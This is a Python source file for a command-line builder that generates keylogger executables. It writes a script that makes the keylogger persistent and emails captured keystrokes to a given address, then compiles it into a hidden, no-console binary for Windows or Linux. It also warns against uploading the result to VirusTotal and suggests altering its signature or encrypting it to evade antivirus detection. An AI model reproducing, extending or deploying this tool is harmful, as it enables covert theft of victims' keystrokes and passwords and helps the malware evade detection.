#import argparse
import platform
import subprocess
import os
import sys
from pyfiglet import figlet_format
from rich import print

#==========================PATH FOR PYINSTALLER IN LINUX==========================
Pyinstller_path = os.path.expanduser("/root/.wine/drive_c/Python27/Scripts/pyinstaller.exe")

#=====================Making Dictionary for command and tool===================
available_commands = {
    "[green]list": "List available tools\n",
    "use": "Use a specific tool\n",
    "info": "Information on a specific tool\n",
    "exit": "Completely exit Veil\n"
}
available_tools = {
    "  1": "Simple Keylogger\n"
}
#======================LOGO AT END OF CLI==============================
def logo_for_ending():
    logo = ('''[yellow]
&&&&&&@@@@@@@@@$$$$$$$$%%%***:::.....................!***%%%%$$$$$$$$$$@@@@@@@@@
&&&@@@@@@@@@@@@$$$$$$$%%%***::S&:.......:%%:..........!***%%%%$$$$$$$$$@@@@@@@@@
&&@@@@$$$$@@@@$$$$$$$$%%***:.:#*@.......%**@..........:****%%%$$$$$$$$@@@@@@@@@@
&&@@@@$$$$$$$$$$$$$$$%%%***...&*&:....:$S**S*..........!***%%%$$$$$$$$@@@@@@@@@@
&&&@@@@$$$$$$$$$$$$$$%%%**!.:$S@:.....$*****S:.........:***%%%$$$$$$$$$@@@@@@@@@
&&&&@@@$$$$$$$$$$$$$$%%%**!$#$!!.....!*******$.........:***%%%$$$$$$$$$@@@@@@@@@
&&&&@@@$$$$$$$$$$$$$$%%%**##:.:*.....%********.........!***%%%$$$$$$$$$@@@@@@@@@
&&&&&&@@@$$$$$$$$$$$$$%%%#S!..:!..:@#*******#.........:***%%%%$$$$$$$$@@@@@@@@@@
&&&&@@@@@@$$$$$$$$$$$$%%&S%*:.!$%#S**********#$*::...:!***%%%$$$$$$$$$@@@@@@$$$$
&&&@@@@@@@@$$$$$$$$$$$$$*@***!&******************S#@!!***%%%$$$$$$$$$$@@$$$$$$$$
&&&&@@@@@@@@@$$$$$$$$$$@*$%*%@S*********************S***%%%$$$$$$$$$$$@$$$$$$@$$
&&&&&@@@@@@@@@@$$$$$$$$@*$%%%$@**********************$*%%%$$$$$$$$$$$$@$$$$@@@@@
&&&&&&@@@@@@@@@@$$$$$$$@*@%%%%#**********************#%%%$$$$$$$$$$$$@@@$$@@@@@@
&&&&&&&&@@@@@@@@@$$$$$$$*&%$%&****S*******************$%$$$$$$$$$$$$$$$$$$$$@@@@
&&&&&&&&&@@@@@@@@@@@$$$$#S$$$****SS*************S@****#%$$$$$$$$$$$$$$$$$$$@@@@@
&&&&&&&&&@@@@@@@@@@@@$$$@*@$#***#&**************$%$****$$$$$$$$$$$$$$$$$@@@@@@@$
&&&&&&&&&&&@@@@@@@@@@$$$$S##***S#**************&$$%#***&$$$$$$$$$$$@@@@@@@@@@@@@
&&&&&&&&&&&@@@@@@@@@@&&&#**********************$$$$&***@$$$$$$$$$@@@@$$$$$$$$$$@
&&&&&&&&&&&&@@@@@&#S***************************@$$$@***$$$$$@@@@@@@$$$@@@@@@@@@@
&&&&&&&&&&&&&@@@#******************SS**********S$$$$#*S$$$$@@@$$@@@@@@@@@@@@@@@@
&&&&&&&&&&&&&@&S*****************#@$S***********#$$$&*#$@$$$$$$$@@@@@@@@@@@@@@@@
&&&&&&&&&&&&&&S************SSSS#@$$@*************@$$&*S$$@@@@@@@@@@@@@@@@@@@@@@@
#&&&&&&&&&&&S*********S#&*#@@@@@@@@&*************#$@***&$@@@@@@@@@@@@@@@@@@@@$@@
##&##S***************&@@&*&@@@@&@@@#**************$@S&*#$@@@@@@@@@@@@@@@@@@@@@@@
##&####****SSS#&&&#*S@@@SS@@@@@&@@@S**************@$&@*#$@@@@@@@@@@@@@@@@@@@@@@@
###&&&&&##&&&&&&&&&&&@@@*#@@@#S***********S*******@$$&#@@@@@@@@$$@@@@@@@@@$$@@@@
######&&&&&&&&&&&&&&&&@#*****************S$&******&@@@@@@@$$$$$$$$@@@@@@@@@@@&&&
#######&&&&&&&&&&&&&&&&**SS**************@@@S*****&@@@@@@@@@@@@@@@@@@@@@&&&&&&&&
####&&&&&&&&&&&&&&&&&&&#*&@&##&S*S&******@@@&*****#@@@@@@@@@@@@@@@@@&&&&&&&&&&&&
###&&&##&&&&&&@@&&&&&&&&*#@@@@@&@$@*****S@@@@S****S@@&&@@@@@@@&&&&&&&&&&&&&&&&&&
#########&&&@$$$$$@@&&&&#*&&&&&&&@#*****#@@@#******#@&&&&&&&&&&&&&&&&&&&&&&&&&&&
#######&&&&&@@@@@@&&&&&&&S*&&&&&@@******#@&@S******#@&&&&&&&&&&&&&&&&&&&&&&&&&&&
######&&&&&&&&&&&&&&&&&&&&S*&&&&&&#*****&&&&&******&@&&&&&&&&&&&&&&&&&&&&&&&&&&&
####&&&&&&&&&&&&&&&&&&&&&&&#SS&&&&&****S&&&@&******&@&&&&&&&&&&&&&@@@@&&&&&&&&&&
####&&@&&&&&&&&&&&&&&&&&&&&&&#*S&&&#***S&&@$@&S****&&&&&&&&&&&&&&&&@@@&&&&&&&&&&\n                               [red]|| JAI SHRI RAM ||''')
    return logo


def main():
    try:
        if platform.system().startswith("Windows"):#CHECKING IS THE PROGRAM IS EXECUTED ON WINDOWS OR NOT
            subprocess.call("cls", shell=True)
        else:
            subprocess.call("clear", shell=True)
        print(figlet_format("**KEYLOGGER**", font="standard"))#CLI KEYLOGGER ACSII ART
        # print(chalk.green("````Keylogger Program````"))
        print('[bold][blue]Available Commands :\n')

#=========Initializing a variables to store the dictionary value in string===========================
        strin_cmd = ' '
        strin_tool = ''
        for key in available_commands:
            strin_cmd += str(key) + ' : ' + available_commands[key] + ' '#CONVERTING DICTIONARY INTO NORMAL STRING
        print(strin_cmd)

        print("\n[bold][blue]Available Tools :\n")
        for key in available_tools:
            strin_tool += str(key) + ' : ' + available_tools[key] + ' '#CONVERTING DICTIONARY INTO NORMAL STRING
        print(strin_tool)

        while True:
            main_menu_cmd = input("Logger - >").strip()

            # Implementing the use command
            if main_menu_cmd.startswith("use"):

                # Check to make sure a tool is provided with use command
                if len(main_menu_cmd.split()) == 1 and main_menu_cmd == "use":
                    print("\n\n[bold][purple]Select any one tool:\n", '\n', strin_tool)
                    # print("[-]Please Select a tools")

                elif len(main_menu_cmd.split()) == 2:
                    tool_choice = main_menu_cmd.split()[1]#EXTRACTING THE INT USED AFTER USE COMMAND

                    if tool_choice == '1':
                        print("\n[green][+]Provide the details for your keylogger file::--\n")
                        making_keylogger()

            # Implementing the List command

            elif main_menu_cmd.startswith("list"):
                print("\n   [red][bold]Only ", len(available_tools), " [bold][red]tools is available :\n\n", "  ", strin_tool)

            # Implementing the Exit command

            elif main_menu_cmd.startswith("exit"):

                if platform.system().startswith("Windows"):#Checking the file is executed on windows
                    os.system("cls")
                    logo_ = logo_for_ending()
                    print(logo_)
                    print("[red]Warning :\n`````````````[***] Don't upload the file on Virustotal.com[***]`````````````")
                    input("[-]Click enter to exit....... ")

                    os.system("cls")
                    sys.exit()

                else:
                
                    os.system("clear")
                    logo_ = logo_for_ending()
                    print(logo_)
                    print(
                        "[red]Warning :\n\n`````````````[***] Don't upload the file on Virustotal.com[***]`````````````")
                    input("[-]Click enter to exit....... ")

                    os.system("clear")
                    sys.exit()

            #Implementing the info command

            elif main_menu_cmd.startswith('info'):
                print('''\nAvailable tool:
                 [green]use : using use command you can select any one available tool\n
                 exit : for closing this program\n
                 list : to list all the available tool\n\n
                  [red]Note:\n[-][-]If the keylogger is getting detected try to use HXD 
                  editor to change the signature of the exe or encrypt the file with Pycrypt[-][-]
                 ''')

    except KeyboardInterrupt:
        print("\n\n[bold][red][-]CTRL C is Pressed Quitting........!!!!")

#=================TAKING USER INPUT FOR KEYLOGGER FILE====================

def making_keylogger():

    email = input("[+]Enter your email :")
    password = input("[+]Enter your passwd(APP passwd) :")
    time_interval = input("[+]Enter interval for the email to come :")
    select_os = input("[+]Enter the OS\nAvailable OS : win or linux :")
    file_name = input("[+]Enter name for the file :")
    create_keylogger_executable(file_name, time_interval, email, password)


#======================COMPILING KEYLOGGER ACCORDING TO THE OS PROVIDED======================

    if select_os == "win":
        if platform.system().startswith("Windows"):
            compile_for_windows_in_windows(file_name)

        else:
            compile_for_windows(file_name)

    elif select_os == "linux":
        compile_for_linux(file_name)


'''===================Code for Arguments type Cli=======================
def get_arguments():
    parser = argparse.ArgumentParser(description='ZLogger v2.0')
    parser._optionals.title = "Optional Arguments"
    parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds.", default=120)
    parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
    parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
print("[green]Use the following link to do so https://myaccount.google.com/lesssecureapps")
    required_arguments = parser.add_argument_group('Required Arguments')
    required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send reports to.")
    required_arguments.add_argument("-p", "--password", dest="password", help="Password for the email address given in the -e argument.")
    required_arguments.add_argument("-o", "--out", dest="out", help="Output file name.", required=True)
    return parser.parse_args()
'''

#==================== Making Keylogger File============================
def create_keylogger_executable(file_name, interval, email, password):
    with open(file_name, "w+") as file:
        file.write("import keylogger\n")
        file.write("zlogger = keylogger.Keylogger(" + interval + ",'" + email + "','" + password + "')\n")
        file.write("zlogger.become_persistent()\n")
        file.write("zlogger.start()\n")

#==================================Compiling for Windows========================
def compile_for_windows(file_name):
    subprocess.call(["wine", Pyinstller_path, "--onefile", "--noconsole", file_name])

#=========================Compiling for Windows if the program is executed on Windows==================
def compile_for_windows_in_windows(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])

#=========================Compiling for Linux==============================
def compile_for_linux(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])


'''===================Code for Arguments type Cli=======================
#arguments = get_arguments()
create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password)
if arguments.windows:
    compile_for_windows(arguments.out)
if arguments.linux:
    compile_for_linux(arguments.out)
'''

if __name__ == "__main__":
    main()
